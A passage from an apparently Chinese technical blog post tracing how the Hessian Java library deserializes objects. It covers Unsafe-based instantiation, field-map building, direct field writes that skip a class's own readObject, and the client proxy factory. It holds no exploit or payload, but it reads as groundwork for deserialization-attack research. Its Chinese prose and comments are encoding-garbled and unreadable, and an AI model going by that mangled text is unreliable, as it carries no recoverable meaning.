å­—æ®µååˆ°å­—æ®µååºåˆ—åŒ–å™¨çš„æ˜ å°„</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> HashMap&lt;String, FieldDeserializer2&gt; <span class="title function_">getFieldMap</span><span class="params">(Class&lt;?&gt; cl, FieldDeserializer2Factory fieldFactory)</span> &#123;</span><br><span class="line">    HashMap&lt;String, FieldDeserializer2&gt; fieldMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, FieldDeserializer2&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; cl != <span class="literal">null</span>; cl = cl.getSuperclass()) &#123;</span><br><span class="line">        Field[] fields = cl.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> fields[i];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è·³è¿‡ transient æˆ– static å­—æ®µ</span></span><br><span class="line">            <span class="keyword">if</span> (Modifier.isTransient(field.getModifiers()) || Modifier.isStatic(field.getModifiers())) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// è‹¥å·²å­˜åœ¨åŒåå­—æ®µï¼ˆä¼˜å…ˆä¿ç•™å­ç±»å£°æ˜ï¼‰</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (fieldMap.get(field.getName()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * å¦‚éœ€ä»…å¤„ç† public å­—æ®µï¼Œå¯åœ¨æ­¤å†³å®šæ˜¯å¦å¼€å¯å¯è®¿é—®æ€§ï¼š</span></span><br><span class="line"><span class="comment">             * try &#123;</span></span><br><span class="line"><span class="comment">             *     field.setAccessible(true);</span></span><br><span class="line"><span class="comment">             * &#125; catch (Throwable e) &#123;</span></span><br><span class="line"><span class="comment">             *     e.printStackTrace();</span></span><br><span class="line"><span class="comment">             * &#125;</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// é€šè¿‡å·¥å‚ä¸ºè¯¥å­—æ®µåˆ›å»ºååºåˆ—åŒ–å™¨å¹¶åŠ å…¥æ˜ å°„</span></span><br><span class="line">            <span class="type">FieldDeserializer2</span> <span class="variable">deser</span> <span class="operator">=</span> fieldFactory.create(field);</span><br><span class="line">            fieldMap.put(field.getName(), deser);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fieldMap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>UnsafeDeserializer#readMap</code> å…ˆåˆ›å»ºäº†ä¸€ä¸ªå®ä¾‹å¯¹è±¡ï¼Œå†å¯¹è¿™ä¸ªå®ä¾‹å¯¹è±¡è¿›è¡Œæ“ä½œã€‚è¿™é‡Œçš„ <code>instantiate</code> å°±æ˜¯åˆ©ç”¨ <code>Unsafe</code> åœ¨å†…å­˜å±‚é¢ç›´æ¥å¼€è¾Ÿå‡ºä¸€ä¸ªå¯¹è±¡çš„ç©ºé—´ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä» Hessian è¾“å…¥æµè¯»å–é”®å€¼å¯¹å¹¶å¡«å……åˆ°ä¸€ä¸ªæ–°åˆ›å»ºçš„å¯¹è±¡å®ä¾‹ä¸­ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * æµç¨‹ï¼š</span></span><br><span class="line"><span class="comment"> * 1) é€šè¿‡ &#123;<span class="doctag">@link</span> #instantiate()&#125; ä½¿ç”¨ Unsafe åˆ†é…æœªåˆå§‹åŒ–çš„å¯¹è±¡ï¼ˆä¸è°ƒç”¨æ„é€ å‡½æ•°ï¼‰ï¼›</span></span><br><span class="line"><span class="comment"> * 2) è°ƒç”¨é‡è½½çš„ readMap(in, obj) å°†è¾“å…¥æ˜ å°„åˆ°è¯¥å¯¹è±¡ï¼›</span></span><br><span class="line"><span class="comment"> * 3) å¼‚å¸¸å¤„ç†ï¼šIO å’Œè¿è¡Œæ—¶å¼‚å¸¸åŸæ ·æŠ›å‡ºï¼Œå…¶å®ƒå¼‚å¸¸åŒ…è£…ä¸º IOExceptionWrapperã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> in Hessian è¾“å…¥</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>   ååºåˆ—åŒ–åçš„å¯¹è±¡</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException è¯»å†™é”™è¯¯æˆ–è¢«åŒ…è£…çš„å¼‚å¸¸</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">readMap</span><span class="params">(AbstractHessianInput in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 1) æœªç»æ„é€ å‡½æ•°çš„å®ä¾‹åˆ†é…ï¼ˆé€‚ç”¨äºæ— å¯è§æ— å‚æ„é€ å™¨çš„ç±»å‹ï¼‰</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> instantiate();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) å°†è¾“å…¥çš„ Map å†…å®¹è¯»å…¥è¯¥å¯¹è±¡</span></span><br><span class="line">        <span class="keyword">return</span> readMap(in, obj);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="comment">// IO å¼‚å¸¸ç›´æ¥é€ä¼ </span></span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">        <span class="comment">// è¿è¡Œæ—¶å¼‚å¸¸ç›´æ¥é€ä¼ ï¼ˆä¿æŒè°ƒç”¨æ–¹å †æ ˆè¯­ä¹‰ï¼‰</span></span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// å…¶å®ƒå—æ£€å¼‚å¸¸ç»Ÿä¸€åŒ…è£…ä¸º IOExceptionï¼Œé™„å¸¦ç±»å‹ä¿¡æ¯</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOExceptionWrapper</span>(_type.getName() + <span class="string">&quot;:&quot;</span> + e.getMessage(), e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä½¿ç”¨ Unsafe åˆ†é…å¯¹è±¡å®ä¾‹ï¼ˆä¸è°ƒç”¨æ„é€ å‡½æ•° / æ— éœ€å¯è§çš„æ— å‚æ„é€ ï¼‰ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * æ³¨æ„ï¼šåœ¨ JDK 9+ çš„æ¨¡å—ç³»ç»Ÿä¸‹ï¼Œå¯èƒ½éœ€è¦å¼€æ”¾è®¿é—®æƒé™ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> æœªåˆå§‹åŒ–ï¼ˆæœªæ‰§è¡Œæ„é€ é€»è¾‘ï¼‰çš„å¯¹è±¡å®ä¾‹</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception åˆ†é…å¤±è´¥æ—¶æŠ›å‡º</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">instantiate</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">return</span> _unsafe.allocateInstance(_type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ¥ç€ä»è¾“å…¥æµé‡Œè¯»å–å­—æ®µåï¼Œ<code>_fieldMap</code> ä¸­è·å–å¯¹åº”çš„å­—æ®µååºåˆ—åŒ–å™¨ï¼Œå†å¯¹ <code>obj</code> è¿›è¡Œæ“ä½œã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å°† Hessian è¾“å…¥æµä¸­çš„é”®å€¼å¯¹è¯»å…¥å·²åˆ›å»ºçš„å¯¹è±¡å®ä¾‹ä¸­ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * å¤„ç†æµç¨‹ï¼š</span></span><br><span class="line"><span class="comment"> * 1) å°†ç›®æ ‡å¯¹è±¡åŠ å…¥å¼•ç”¨è¡¨ï¼ˆä»¥ä¾¿å¤„ç†å¾ªç¯å¼•ç”¨/å¤šå¤„å¼•ç”¨ï¼‰ï¼Œè®°å½•å…¶å¼•ç”¨ç´¢å¼•ï¼›</span></span><br><span class="line"><span class="comment"> * 2) å¾ªç¯è¯»å– map æ¡ç›®ï¼šè¯»å–é”®ï¼Œæ ¹æ®å­—æ®µè¡¨æŸ¥æ‰¾å¯¹åº”çš„ååºåˆ—åŒ–å™¨ï¼›</span></span><br><span class="line"><span class="comment"> *    - å‘½ä¸­ï¼šä½¿ç”¨è¯¥å­—æ®µååºåˆ—åŒ–å™¨å°†å€¼å†™å…¥å¯¹è±¡ï¼›</span></span><br><span class="line"><span class="comment"> *    - æœªå‘½ä¸­ï¼šæ¶ˆè´¹è¯¥å€¼ï¼ˆè·³è¿‡æœªçŸ¥å­—æ®µï¼‰ï¼Œç¡®ä¿æµä½ç½®å¯¹é½ï¼›</span></span><br><span class="line"><span class="comment"> * 3) è¯»å–å¹¶æ ¡éªŒ map ç»“æŸæ ‡è®°ï¼›</span></span><br><span class="line"><span class="comment"> * 4) è°ƒç”¨ resolve(in, obj) æ‰§è¡Œâ€œè¯»åè§£æâ€ï¼Œå¦‚è°ƒç”¨ readResolve ç­‰ï¼Œå¯èƒ½è¿”å›æ›¿æ¢å¯¹è±¡ï¼›</span></span><br><span class="line"><span class="comment"> *    è‹¥è¿”å›çš„å¯¹è±¡ä¸åŸå¯¹è±¡ä¸åŒï¼Œåˆ™æ›´æ–°å¼•ç”¨è¡¨ä¸­çš„æ¡ç›®ï¼›</span></span><br><span class="line"><span class="comment"> * 5) è¿”å›æœ€ç»ˆå¯¹è±¡ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> in  Hessian è¾“å…¥æµ</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj å·²å®ä¾‹åŒ–ä½†æœªå¡«å……å­—æ®µçš„å¯¹è±¡</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>    å¡«å……å®Œæˆå¹¶ç»è¿‡ resolve å¤„ç†çš„å¯¹è±¡</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException è¯»å†™é”™è¯¯æˆ–å°è£…åçš„å¼‚å¸¸</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">readMap</span><span class="params">(AbstractHessianInput in, Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 1) åœ¨å¼•ç”¨è¡¨ä¸­ç™»è®°è¯¥å¯¹è±¡ï¼Œå¾—åˆ°å…¶å¼•ç”¨ç´¢å¼•ï¼ˆç”¨äºå¾ªç¯å¼•ç”¨ä¿®å¤ï¼‰</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">ref</span> <span class="operator">=</span> in.addRef(obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) é€æ¡è¯»å–é”®å€¼å¯¹ï¼Œç›´åˆ°é‡åˆ°ç»“æŸæ ‡è®°</span></span><br><span class="line">        <span class="keyword">while</span> (!in.isEnd()) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">key</span> <span class="operator">=</span> in.readObject();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æŒ‰å­—æ®µåæŸ¥æ‰¾å¯¹åº”çš„å­—æ®µååºåˆ—åŒ–å™¨ï¼ˆé€šå¸¸ key ä¸º Stringï¼‰</span></span><br><span class="line">            <span class="type">FieldDeserializer2</span> <span class="variable">deser</span> <span class="operator">=</span> (FieldDeserializer2) _fieldMap.get(key);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (deser != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// å·²çŸ¥å­—æ®µï¼šå°†è¯¥å­—æ®µçš„å€¼è¯»å…¥å¯¹è±¡</span></span><br><span class="line">                deser.deserialize(in, obj);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// æœªçŸ¥å­—æ®µï¼šæ¶ˆè´¹å…¶å€¼ä»¥ä¿æŒæµå¯¹é½ï¼ˆä¸¢å¼ƒè¯¥æ¡ç›®ï¼‰</span></span><br><span class="line">                in.readObject();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) è¯»å– map ç»“æŸæ ‡è®°</span></span><br><span class="line">        in.readMapEnd();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4) è¯»åè§£æï¼šå¯èƒ½è°ƒç”¨ readResolve ç­‰è¿”å›æ›¿æ¢å®ä¾‹</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">resolve</span> <span class="operator">=</span> resolve(in, obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è‹¥å‘ç”Ÿå¯¹è±¡æ›¿æ¢ï¼Œéœ€åŒæ­¥æ›´æ–°å¼•ç”¨è¡¨ä¸­çš„å¯¹è±¡æŒ‡é’ˆ</span></span><br><span class="line">        <span class="keyword">if</span> (obj != resolve) &#123;</span><br><span class="line">            in.setRef(ref, resolve);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5) è¿”å›æœ€ç»ˆå¯¹è±¡</span></span><br><span class="line">        <span class="keyword">return</span> resolve;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="comment">// IO å¼‚å¸¸ç›´æ¥é€ä¼ </span></span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// å…¶ä»–å¼‚å¸¸ç»Ÿä¸€åŒ…è£…ä¸º IOExceptionWrapper ä»¥æä¾›æ›´å¤šä¸Šä¸‹æ–‡</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOExceptionWrapper</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>FieldDeserializer2FactoryUnsafe</code> å†…ç½®äº†ä¸€å †åŸºæœ¬ç±»å‹çš„ååºåˆ—åŒ–å™¨ï¼Œå¤§éƒ½æ˜¯ç›´æ¥ä»è¾“å…¥æµè¯»å–çš„æ•°æ®å°±æ˜¯å­—æ®µå€¼ã€‚</p>
<p>ä¾‹å¦‚å¯¹äºæ™®é€šå¯¹è±¡ï¼Œè¿™é‡Œè·å–çš„ååºåˆ—åŒ–å™¨ä¸º <code>com.caucho.hessian.io.FieldDeserializer2FactoryUnsafe$ObjectFieldDeserializer</code>ï¼Œå¯ä»¥çœ‹åˆ°æœ€æ ¸å¿ƒçš„æ“ä½œæ˜¯ <code>_unsafe.putObject(obj, _offset, value);</code> ä¿®æ”¹å¯¹è±¡åœ¨å†…å­˜ä¸­å­—æ®µåç§»é‡å¤„çš„å€¼</p>
<p>å› æ­¤å°±æ²¡æœ‰è§¦å‘æˆ‘ä»¬è‡ªå®šä¹‰çš„<code>readObject</code>äº†ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ååºåˆ—åŒ–å•ä¸ªå­—æ®µå¹¶å†™å…¥ç›®æ ‡å¯¹è±¡ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * æµç¨‹ï¼š</span></span><br><span class="line"><span class="comment"> * 1) æŒ‰å­—æ®µçš„å£°æ˜ç±»å‹ï¼ˆ_field.getType()ï¼‰ä»è¾“å…¥æµè¯»å–å€¼ï¼›</span></span><br><span class="line"><span class="comment"> * 2) ä½¿ç”¨ Unsafe æŒ‰åç§»é‡ _offset å°†è¯¥å€¼ç›´æ¥å†™å…¥å¯¹è±¡å†…å­˜ï¼ˆç»•è¿‡ setter/å¯è§æ€§æ£€æŸ¥ï¼‰ï¼›</span></span><br><span class="line"><span class="comment"> * 3) è‹¥å‘ç”Ÿå¼‚å¸¸ï¼Œè®°å½•åŒ…å«å­—æ®µã€å¯¹è±¡ä¸å½“å‰å€¼çš„è¯¦ç»†é”™è¯¯ä¿¡æ¯ï¼Œä¾¿äºæ’æŸ¥ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> in  Hessian è¾“å…¥æµ</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj ç›®æ ‡å¯¹è±¡å®ä¾‹</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException è¯»å–è¿‡ç¨‹ä¸­çš„ IO å¼‚å¸¸</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(AbstractHessianInput in, Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// æŒ‰å­—æ®µå£°æ˜çš„ç±»å‹è¯»å–è¯¥å­—æ®µçš„å€¼</span></span><br><span class="line">        value = in.readObject(_field.getType());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é€šè¿‡ Unsafe ç›´æ¥å†™å…¥å¯¹è±¡å†…å­˜ï¼ˆåŸºäºå­—æ®µåç§»é‡ï¼‰</span></span><br><span class="line">        _unsafe.putObject(obj, _offset, value);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// æ•è·å¹¶è®°å½•å¼‚å¸¸ï¼ŒåŒ…å«å­—æ®µã€å¯¹è±¡ä¸å·²è¯»å–çš„å€¼</span></span><br><span class="line">        logDeserializeError(_field, obj, value, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="å®¢æˆ·ç«¯-1"><a href="#å®¢æˆ·ç«¯-1" class="headerlink" title="å®¢æˆ·ç«¯"></a>å®¢æˆ·ç«¯</h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.caucho.hessian.client.HessianProxyFactory;</span><br><span class="line"></span><br><span class="line"><span class="type">HessianProxyFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianProxyFactory</span>();</span><br><span class="line"><span class="comment">// å¦‚éœ€ Hessian 2 åè®®ï¼šfactory.setHessian2Request(true); factory.setHessian2Reply(true);</span></span><br><span class="line"><span class="type">HelloService</span> <span class="variable">hello</span> <span class="operator">=</span> (HelloService) factory.create(</span><br><span class="line">        HelloService.class, <span class="string">&quot;http://localhost:8080/yourapp/hessian/hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(hello.hi(<span class="string">&quot;world&quot;</span>));</span><br></pre></td></tr></table></figure></div>

<p>å®¢æˆ·ç«¯ <code>com.caucho.hessian.client.HessianProxyFactory#create</code> ä¼šè°ƒç”¨åˆ°å¤šä¸ªé‡è½½å‡½æ•°ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">at com.caucho.hessian.client.HessianProxyFactory.create(HessianProxyFactory.java:455)</span><br><span class="line">at com.caucho.hessian.client.HessianProxyFactory.create(HessianProxyFactory.java:430)</span><br><span class="line">at com.caucho.hessian.client.HessianProxyFactory.create(HessianProxyFactory.java:408)</span><br></pre></td></tr></table></figure></div>

<p>æœ€ç»ˆ <code>HessianProxyFactory#create</code> è¿”å›ä¸€ä¸ªä»£ç†å¯¹è±¡ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä½¿ç”¨ç»™å®š URL åˆ›å»ºä¸€ä¸ªå®ç°æŒ‡å®šæ¥å£çš„ä»£ç†å¯¹è±¡ã€‚</span></span><br><span class="line"><span class="comment"> * è¿”å›å¯¹è±¡ä¼šå®ç° api æŒ‡å®šçš„ä¸šåŠ¡æ¥å£ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> * String url = &quot;http://localhost:8080/ejb/hello&quot;;</span></span><br><span class="line"><span class="comment"> * HelloHome hello = (HelloHome) factory.create(HelloHome.class, new URL(url),</span></span><br><span class="line"><span class="comment"> *                                              Thread.currentThread().getContextClassLoader());</span></span><br><span class="line"><span class="comment"> * &lt;/pre&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> api    ä»£ç†ç±»éœ€è¦å®ç°çš„æ¥å£ç±»å‹ï¼ˆä¸šåŠ¡æ¥å£ï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> url    è¿œç«¯æœåŠ¡ï¼ˆå®¢æˆ·ç«¯å¯¹è±¡ï¼‰æ‰€åœ¨çš„ URL</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> loader ç”¨äºå®šä¹‰/åŠ è½½ä»£ç†ç±»çš„ç±»åŠ è½½å™¨ï¼ˆå¸¸ç”¨ï¼šTCCL æˆ– api.getClassLoader()ï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>       ä¸€ä¸ªå®ç°äº† api æ¥å£çš„åŠ¨æ€ä»£ç†å®ä¾‹</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NullPointerException å½“ api ä¸ºç©ºæ—¶æŠ›å‡º</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">create</span><span class="params">(Class&lt;?&gt; api, URL url, ClassLoader loader)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (api == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// é¿å…åˆ›å»ºæ— æ•ˆä»£ç†ï¼šapi æ˜¯å¿…é¡»çš„</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;api must not be null for HessianProxyFactory.create()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// JDK åŠ¨æ€ä»£ç†çš„è°ƒç”¨åˆ†æ´¾å™¨ï¼šæŠŠæ–¹æ³•è°ƒç”¨å°è£…ä¸º Hessian è¯·æ±‚å¹¶å‘é€åˆ°è¿œç«¯</span></span><br><span class="line">    <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianProxy</span>(url, <span class="built_in">this</span>, api);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç”ŸæˆåŠ¨æ€ä»£ç†ç±»ï¼š</span></span><br><span class="line">    <span class="comment">// - loaderï¼šç”¨äºåŠ è½½ç”Ÿæˆçš„ä»£ç†ç±»çš„ç±»åŠ è½½å™¨ï¼ˆå¿…é¡»é nullï¼‰</span></span><br><span class="line">    <span class="comment">// - interfacesï¼šä»£ç†éœ€è¦å®ç°çš„æ¥å£ï¼›è¿™é‡ŒåŒ…å«ä¸šåŠ¡æ¥å£ api å’Œ HessianRemoteObjectï¼ˆæ ‡è®°/æ‰©å±•ç”¨é€”ï¼‰</span></span><br><span class="line">    <span class="comment">// - handlerï¼šæ‰€æœ‰æ–¹æ³•è°ƒç”¨éƒ½ä¼šè½¬å‘åˆ°è¯¥å¤„ç†å™¨</span></span><br><span class="line">    <span class="keyword">return</span> Proxy.newProxyInstance(</span><br><span class="line">            loader,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; api, HessianRemoteObject.class &#125;,</span><br><span class="line">            handler</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ‰€ä»¥æ— è®ºè°ƒç”¨å•¥æ–¹æ³•éƒ½ä¼šèµ°åˆ° <code>com.caucho.hessian.client.HessianProxy#invoke</code> æ–¹æ³•ã€‚</p>
